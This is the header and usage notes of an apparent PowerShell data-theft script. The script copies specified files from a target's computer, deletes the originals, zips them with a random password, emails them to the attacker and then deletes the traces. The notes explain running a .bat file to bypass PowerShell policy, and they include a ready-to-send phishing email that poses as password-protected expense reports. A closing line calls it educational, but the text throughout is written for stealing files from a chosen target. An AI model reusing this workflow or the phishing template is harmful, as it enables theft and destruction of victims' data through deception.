#Author: Praneeth Marella 
#Date: April 23 2017

#Description: This is a simple powershell script that can copy specified files from a computer into a folder then zip them with a random 8 character password. The files that are copied are deleted from the source. Then the script emails the password and zip folder to a specified email (I suggest using Guerrilla Email.) Now to clean up the evidence the script deletes the folder files were copied to and the zip folder.

#How to use: First open up the powershell script and modify it to include the necessary file paths that files need to be stolen from. Then specifiy the email that you want to use to send the password and zip folder.

In order to run the script on a target computer the user needs to run the .bat file so that it can bypass powershell permissions and policies.

Now all you need is a target and instruct them in the email to download the .bat and .ps1 files and run the .bat on their computer.

#Template e-mail:

Good Afternoon Dr.John,

Attached are the company expense reports for this month. The file is password protected so you need to download both the files and run (specify bat file name here) so that the expense report (the .ps1 file) can be unlocked for you to read.

Sincerely, Script Kiddie

#Note: This is intended for education purpose/use only
